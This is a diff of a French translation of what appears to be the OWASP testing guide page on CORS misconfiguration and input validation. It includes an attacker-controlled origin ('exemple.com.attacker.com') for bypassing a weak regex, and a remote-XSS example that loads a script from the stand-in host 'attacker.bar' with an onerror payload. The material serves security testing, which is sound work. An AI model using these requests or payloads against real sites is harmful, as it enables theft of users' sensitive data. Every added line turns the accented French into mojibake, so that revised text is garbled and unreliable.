@@ -6,63 +6,63 @@
 
 ## Sommaire
 
-[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) est un mécanisme qui permet à un navigateur Web d'effectuer des requêtes interdomaines à l'aide de XMLHttpRequest (XHR) niveau 2 (L2 ) API de manière contrôlée. Dans le passé, l'API XHR L1 n'autorisait que l'envoi de requêtes au sein de la même origine, car elle était restreinte par la [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/ Same-origin_policy) (SOP).
+[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) est un mÃ©canisme qui permet Ã  un navigateur Web d'effectuer des requÃªtes interdomaines Ã  l'aide de XMLHttpRequest (XHR) niveau 2 (L2 ) API de maniÃ¨re contrÃ´lÃ©e. Dans le passÃ©, l'API XHR L1 n'autorisait que l'envoi de requÃªtes au sein de la mÃªme origine, car elle Ã©tait restreinte par la [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) (SOP).
 
-Les requêtes cross-origin ont un en-tête "Origin" qui identifie le domaine à l'origine de la requête et est toujours envoyé au serveur. CORS définit le protocole à utiliser entre un navigateur Web et un serveur pour déterminer si une requête cross-origin est autorisée. Les [en-têtes] HTTP (https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) sont utilisés pour accomplir cela.
+Les requÃªtes cross-origin ont un en-tÃªte "Origin" qui identifie le domaine Ã  l'origine de la requÃªte et est toujours envoyÃ© au serveur. CORS dÃ©finit le protocole Ã  utiliser entre un navigateur Web et un serveur pour dÃ©terminer si une requÃªte cross-origin est autorisÃ©e. Les [en-tÃªtes HTTP](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) sont utilisÃ©s pour accomplir cela.
 
-La [spécification W3C CORS](https://www.w3.org/TR/cors/) stipule que pour les requêtes non simples, telles que les requêtes autres que GET ou POST ou les requêtes utilisant des informations d'identification, une requête OPTIONS avant le vol doit être envoyé à l'avance pour vérifier si le type de demande aura un impact négatif sur les données. La requête préliminaire vérifie les méthodes et les en-têtes autorisés par le serveur, et si les informations d'identification sont autorisées. En fonction du résultat de la requête OPTIONS, le navigateur décide si la requête est autorisée ou non.
+La [spÃ©cification W3C CORS](https://www.w3.org/TR/cors/) stipule que pour les requÃªtes non simples, telles que les requÃªtes autres que GET ou POST ou les requÃªtes utilisant des informations d'identification, une requÃªte OPTIONS avant le vol doit Ãªtre envoyÃ© Ã  l'avance pour vÃ©rifier si le type de demande aura un impact nÃ©gatif sur les donnÃ©es. La requÃªte prÃ©liminaire vÃ©rifie les mÃ©thodes et les en-tÃªtes autorisÃ©s par le serveur, et si les informations d'identification sont autorisÃ©es. En fonction du rÃ©sultat de la requÃªte OPTIONS, le navigateur dÃ©cide si la requÃªte est autorisÃ©e ou non.
 
-### Origine et contrôle d'accès-Autoriser l'origine
+### Origine et contrÃ´le d'accÃ¨s-Autoriser l'origine
 
-L'en-tête de requête "Origin" est toujours envoyé par le navigateur dans une requête CORS et indique l'origine de la requête. L'en-tête Origin ne peut pas être modifié à partir de JavaScript car [le navigateur (l'agent utilisateur) bloque sa modification](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name) ; cependant, se fier à cet en-tête pour les vérifications de contrôle d'accès n'est pas une bonne idée car il peut être usurpé en dehors du navigateur, par exemple en utilisant un proxy, vous devez donc toujours vérifier que les protocoles au niveau de l'application sont utilisés pour protéger les données sensibles.
+L'en-tÃªte de requÃªte "Origin" est toujours envoyÃ© par le navigateur dans une requÃªte CORS et indique l'origine de la requÃªte. L'en-tÃªte Origin ne peut pas Ãªtre modifiÃ© Ã  partir de JavaScript car [le navigateur (l'agent utilisateur) bloque sa modification](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)Â ; cependant, se fier Ã  cet en-tÃªte pour les vÃ©rifications de contrÃ´le d'accÃ¨s n'est pas une bonne idÃ©e car il peut Ãªtre usurpÃ© en dehors du navigateur, par exemple en utilisant un proxy, vous devez donc toujours vÃ©rifier que les protocoles au niveau de l'application sont utilisÃ©s pour protÃ©ger les donnÃ©es sensibles.
 
-`Access-Control-Allow-Origin` est un en-tête de réponse utilisé par un serveur pour indiquer quels domaines sont autorisés à lire la réponse. Sur la base de la spécification CORS W3, il appartient au client de déterminer et d'appliquer la restriction d'accès du client aux données de réponse basées sur cet en-tête.
+`Access-Control-Allow-Origin` est un en-tÃªte de rÃ©ponse utilisÃ© par un serveur pour indiquer quels domaines sont autorisÃ©s Ã  lire la rÃ©ponse. Sur la base de la spÃ©cification CORS W3, il appartient au client de dÃ©terminer et d'appliquer la restriction d'accÃ¨s du client aux donnÃ©es de rÃ©ponse basÃ©es sur cet en-tÃªte.
 
-Du point de vue des tests de sécurité, vous devez rechercher des configurations non sécurisées, par exemple en utilisant un caractère générique `*` comme valeur de l'en-tête `Access-Control-Allow-Origin`, ce qui signifie que tous les domaines sont autorisés. Un autre exemple non sécurisé est lorsque le serveur renvoie l'en-tête d'origine sans aucune vérification supplémentaire, ce qui peut conduire à l'accès à des données sensibles. Notez que la configuration permettant d'autoriser les requêtes cross-origin est très peu sécurisée et n'est pas acceptable de manière générale, sauf dans le cas d'une API publique qui se veut accessible à tous.
+Du point de vue des tests de sÃ©curitÃ©, vous devez rechercher des configurations non sÃ©curisÃ©es, par exemple en utilisant un caractÃ¨re gÃ©nÃ©rique `*` comme valeur de l'en-tÃªte `Access-Control-Allow-Origin`, ce qui signifie que tous les domaines sont autorisÃ©s. Un autre exemple non sÃ©curisÃ© est lorsque le serveur renvoie l'en-tÃªte d'origine sans aucune vÃ©rification supplÃ©mentaire, ce qui peut conduire Ã  l'accÃ¨s Ã  des donnÃ©es sensibles. Notez que la configuration permettant d'autoriser les requÃªtes cross-origin est trÃ¨s peu sÃ©curisÃ©e et n'est pas acceptable de maniÃ¨re gÃ©nÃ©rale, sauf dans le cas d'une API publique qui se veut accessible Ã  tous.
 
 ### Access-Control-Request-Method & Access-Control-Allow-Method
 
-L'en-tête "Access-Control-Request-Method" est utilisé lorsqu'un navigateur effectue une requête OPTIONS en amont et permet au client d'indiquer la méthode de requête de la requête finale. D'autre part, le `Access-Control-Allow-Method` est un en-tête de réponse utilisé par le serveur pour décrire les méthodes que les clients sont autorisés à utiliser.
+L'en-tÃªte "Access-Control-Request-Method" est utilisÃ© lorsqu'un navigateur effectue une requÃªte OPTIONS en amont et permet au client d'indiquer la mÃ©thode de requÃªte de la requÃªte finale. D'autre part, le `Access-Control-Allow-Method` est un en-tÃªte de rÃ©ponse utilisÃ© par le serveur pour dÃ©crire les mÃ©thodes que les clients sont autorisÃ©s Ã  utiliser.
 
 ### Access-Control-Request-Headers & Access-Control-Allow-Headers
 
-Ces deux en-têtes sont utilisés entre le navigateur et le serveur pour déterminer quels en-têtes peuvent être utilisés pour effectuer une requête cross-origin.
+Ces deux en-tÃªtes sont utilisÃ©s entre le navigateur et le serveur pour dÃ©terminer quels en-tÃªtes peuvent Ãªtre utilisÃ©s pour effectuer une requÃªte cross-origin.
 
 ### Access-Control-Allow-Credentials
 
-Cet en-tête de réponse permet aux navigateurs de lire la réponse lorsque les informations d'identification sont transmises. Lorsque l'en-tête est envoyé, l'application Web doit définir une origine sur la valeur de l'en-tête "Access-Control-Allow-Origin". L'en-tête `Access-Control-Allow-Credentials` ne peut pas être utilisé avec l'en-tête `Access-Control-Allow-Origin` dont la valeur est le caractère générique `*` comme suit :
+Cet en-tÃªte de rÃ©ponse permet aux navigateurs de lire la rÃ©ponse lorsque les informations d'identification sont transmises. Lorsque l'en-tÃªte est envoyÃ©, l'application Web doit dÃ©finir une origine sur la valeur de l'en-tÃªte `Access-Control-Allow-Origin`. L'en-tÃªte `Access-Control-Allow-Credentials` ne peut pas Ãªtre utilisÃ© avec l'en-tÃªte `Access-Control-Allow-Origin` dont la valeur est le caractÃ¨re gÃ©nÃ©rique `*` comme suitÂ :
 
 ```http
 Access-Control-Allow-Origin: *
 Access-Control-Allow-Credentials: true
 ```
 
-### Validation des entrées
+### Validation des entrÃ©es
 
-XHR L2 introduit la possibilité de créer une requête interdomaine à l'aide de l'API XHR pour une compatibilité descendante. Cela peut introduire des vulnérabilités de sécurité qui n'étaient pas présentes dans XHR L1. Les points intéressants du code à exploiter seraient les URL qui sont passées à XMLHttpRequest sans validation, surtout si les URL absolues sont autorisées car cela pourrait conduire à une injection de code. De même, une autre partie de l'application qui peut être exploitée est si les données de réponse ne sont pas échappées et nous pouvons les contrôler en fournissant une entrée fournie par l'utilisateur.
+XHR L2 introduit la possibilitÃ© de crÃ©er une requÃªte interdomaine Ã  l'aide de l'API XHR pour une compatibilitÃ© descendante. Cela peut introduire des vulnÃ©rabilitÃ©s de sÃ©curitÃ© qui n'Ã©taient pas prÃ©sentes dans XHR L1. Les points intÃ©ressants du code Ã  exploiter seraient les URL qui sont passÃ©es Ã  XMLHttpRequest sans validation, surtout si les URL absolues sont autorisÃ©es car cela pourrait conduire Ã  une injection de code. De mÃªme, une autre partie de l'application qui peut Ãªtre exploitÃ©e est si les donnÃ©es de rÃ©ponse ne sont pas Ã©chappÃ©es et nous pouvons les contrÃ´ler en fournissant une entrÃ©e fournie par l'utilisateur.
 
-### Autres en-têtes
+### Autres en-tÃªtes
 
-D'autres en-têtes sont impliqués, tels que "Access-Control-Max-Age", qui détermine l'heure à laquelle une demande de contrôle en amont peut être mise en cache dans le navigateur, ou "Access-Control-Expose-Headers", qui indique quels en-têtes peuvent être exposés en toute sécurité à l'API. d'une spécification d'API CORS.
+D'autres en-tÃªtes sont impliquÃ©s, tels que `Access-Control-Max-Age`, qui dÃ©termine l'heure Ã  laquelle une demande de contrÃ´le en amont peut Ãªtre mise en cache dans le navigateur, ou `Access-Control-Expose-Headers`, qui indique quels en-tÃªtes peuvent Ãªtre exposÃ©s en toute sÃ©curitÃ© Ã  l'API. d'une spÃ©cification d'API CORS.
 
-Pour consulter les en-têtes CORS, reportez-vous au [document CORS MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).
+Pour consulter les en-tÃªtes CORS, reportez-vous au [document CORS MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).
 
 ## Objectifs des tests
 
-- Identifier les terminaux qui implémentent CORS.
-- Assurez-vous que la configuration CORS est sécurisée ou inoffensive.
+- Identifier les terminaux qui implÃ©mentent CORS.
+- Assurez-vous que la configuration CORS est sÃ©curisÃ©e ou inoffensive.
 
 ## Comment tester
 
-Un outil tel que [ZAP](https://www.zaproxy.org) peut permettre aux testeurs d'intercepter les en-têtes HTTP, ce qui peut révéler comment CORS est utilisé. Les testeurs doivent porter une attention particulière à l'en-tête d'origine pour savoir quels domaines sont autorisés. De plus, dans certains cas, une inspection manuelle du JavaScript est nécessaire pour déterminer si le code est vulnérable à l'injection de code en raison d'une mauvaise gestion des entrées fournies par l'utilisateur.
+Un outil tel que [ZAP](https://www.zaproxy.org) peut permettre aux testeurs d'intercepter les en-tÃªtes HTTP, ce qui peut rÃ©vÃ©ler comment CORS est utilisÃ©. Les testeurs doivent porter une attention particuliÃ¨re Ã  l'en-tÃªte d'origine pour savoir quels domaines sont autorisÃ©s. De plus, dans certains cas, une inspection manuelle du JavaScript est nÃ©cessaire pour dÃ©terminer si le code est vulnÃ©rable Ã  l'injection de code en raison d'une mauvaise gestion des entrÃ©es fournies par l'utilisateur.
 
 ### Mauvaise configuration CORS
 
-La définition du caractère générique sur l'en-tête "Access-Control-Allow-Origin" (c'est-à-dire "Access-Control-Allow-Origin : *") n'est pas sécurisée si la réponse contient des informations sensibles. Bien qu'il ne puisse pas être utilisé avec `Access-Control-Allow-Credentials: true` en même temps, il peut être dangereux lorsque le contrôle d'accès est effectué uniquement par les règles de pare-feu ou les adresses IP source, autre que d'être protégé par des informations d'identification .
+La dÃ©finition du caractÃ¨re gÃ©nÃ©rique sur l'en-tÃªte `Access-Control-Allow-Origin` (c'est-Ã -dire `Access-Control-Allow-OriginÂ :Â *`) n'est pas sÃ©curisÃ©e si la rÃ©ponse contient des informations sensibles. Bien qu'il ne puisse pas Ãªtre utilisÃ© avec `Access-Control-Allow-Credentials: true` en mÃªme temps, il peut Ãªtre dangereux lorsque le contrÃ´le d'accÃ¨s est effectuÃ© uniquement par les rÃ¨gles de pare-feu ou les adresses IP source, autre que d'Ãªtre protÃ©gÃ© par des informations d'identification.
 
 #### Wildcard Access-Control-Allow-Origin
 
-Un testeur peut vérifier si `Access-Control-Allow-Origin: *` existe dans les messages de réponse HTTP.
+Un testeur peut vÃ©rifier si `Access-Control-Allow-Origin: *` existe dans les messages de rÃ©ponse HTTP.
 
 ```http
 HTTP/1.1 200 OK
@@ -74,7 +74,7 @@ Content-Type: application/xml
 [Response Body]
 ```
 
-Si une réponse contient des données sensibles, un attaquant peut les voler en utilisant XHR :
+Si une rÃ©ponse contient des donnÃ©es sensibles, un attaquant peut les voler en utilisant XHRÂ :
 
 ```html
 <html>
@@ -100,7 +100,7 @@ Si une réponse contient des données sensibles, un attaquant peut les voler en ut
 
 #### Politique CORS dynamique
 
-Une application Web ou une API moderne peut être implémentée pour autoriser dynamiquement les requêtes cross-origin, généralement afin d'autoriser les requêtes des sous-domaines comme suit :
+Une application Web ou une API moderne peut Ãªtre implÃ©mentÃ©e pour autoriser dynamiquement les requÃªtes cross-origin, gÃ©nÃ©ralement afin d'autoriser les requÃªtes des sous-domaines comme suitÂ :
 
 ```php
 if (preg_match('|\.exemple.com$|', $_SERVER['SERVER_NAME'])) {
@@ -109,7 +109,7 @@ if (preg_match('|\.exemple.com$|', $_SERVER['SERVER_NAME'])) {
 }
 ```
 
-Dans cet exemple, toutes les requêtes provenant des sous-domaines de exemple.com seront autorisées. Il faut s'assurer que l'expression régulière utilisée pour la correspondance est complète. Sinon, s'il correspondait simplement à `exemple.com` (sans `$` ajouté), les attaquants pourraient contourner la politique CORS en ajoutant leur domaine à l'en-tête `Origin`.
+Dans cet exemple, toutes les requÃªtes provenant des sous-domaines de exemple.com seront autorisÃ©es. Il faut s'assurer que l'expression rÃ©guliÃ¨re utilisÃ©e pour la correspondance est complÃ¨te. Sinon, s'il correspondait simplement Ã  `exemple.com` (sans `$` ajoutÃ©), les attaquants pourraient contourner la politique CORS en ajoutant leur domaine Ã  l'en-tÃªte `Origin`.
 
 ```http
 GET /test.php HTTP/1.1
@@ -119,7 +119,7 @@ Origin: http://exemple.com.attacker.com
 Cookie: <session cookie>
 ```
 
-Lorsque la requête ci-dessus est envoyée, si la réponse suivante est renvoyée avec le `Access-Control-Allow-Origin` dont la valeur est la même que l'entrée de l'attaquant, l'attaquant peut lire la réponse par la suite et accéder aux informations sensibles qui ne sont accessibles que par un utilisateur victime.
+Lorsque la requÃªte ci-dessus est envoyÃ©e, si la rÃ©ponse suivante est renvoyÃ©e avec le `Access-Control-Allow-Origin` dont la valeur est la mÃªme que l'entrÃ©e de l'attaquant, l'attaquant peut lire la rÃ©ponse par la suite et accÃ©der aux informations sensibles qui ne sont accessibles que par un utilisateur victime.
 
 ```http
 HTTP/1.1 200 OK
@@ -132,15 +132,15 @@ Content-Type: application/xml
 [Response Body]
 ```
 
-### Faiblesse de la validation des entrées
+### Faiblesse de la validation des entrÃ©es
 
-Le concept CORS peut être vu sous un angle complètement différent. Un attaquant peut autoriser délibérément sa politique CORS à injecter du code dans l'application Web cible.
+Le concept CORS peut Ãªtre vu sous un angle complÃ¨tement diffÃ©rent. Un attaquant peut autoriser dÃ©libÃ©rÃ©ment sa politique CORS Ã  injecter du code dans l'application Web cible.
 
-#### XSS à distance avec CORS
+#### XSS Ã  distance avec CORS
 
-Ce code fait une requête à la ressource passée après le caractère `#` dans l'URL, initialement utilisé pour obtenir des ressources dans le même serveur.
+Ce code fait une requÃªte Ã  la ressource passÃ©e aprÃ¨s le caractÃ¨re `#` dans l'URL, initialement utilisÃ© pour obtenir des ressources dans le mÃªme serveur.
 
-Code vulnérable :
+Code vulnÃ©rableÂ :
 
 ```html
 <script>
@@ -162,11 +162,11 @@ Code vulnérable :
 </body>
 ```
 
-Par exemple, une requête comme celle-ci affichera le contenu du fichier `profile.php` :
+Par exemple, une requÃªte comme celle-ci affichera le contenu du fichier `profile.php`Â :
 
 `http://exemple.foo/main.php#profile.php`
 
-Requête et réponse générées par `http://exemple.foo/profile.php` :
+RequÃªte et rÃ©ponse gÃ©nÃ©rÃ©es par `http://exemple.foo/profile.php`Â :
 
 ```html
 GET /profile.php HTTP/1.1
@@ -183,13 +183,13 @@ Content-Type: text/html
 [Response Body]
 ```
 
-Maintenant, comme il n'y a pas de validation d'URL, nous pouvons injecter un script distant, qui sera injecté et exécuté dans le contexte du domaine `exemple.foo`, avec une URL comme celle-ci :
+Maintenant, comme il n'y a pas de validation d'URL, nous pouvons injecter un script distant, qui sera injectÃ© et exÃ©cutÃ© dans le contexte du domaine `exemple.foo`, avec une URL comme celle-ciÂ :
 
 ```text
 http://exemple.foo/main.php#http://attacker.bar/file.php
 ```
 
-Requête et réponse générées par `http://attacker.bar/file.php` :
+RequÃªte et rÃ©ponse gÃ©nÃ©rÃ©es par `http://attacker.bar/file.php`Â :
 
 ```html
 GET /file.php HTTP/1.1
@@ -207,7 +207,7 @@ Content-Type: text/html
 Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
 ```
 
-## Références
+## RÃ©fÃ©rences
 
-- [Fiche de triche de sécurité OWASP HTML5] (https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
+- [Fiche de triche de sÃ©curitÃ© OWASP HTML5](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
 - [Partage de ressources cross-origin MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
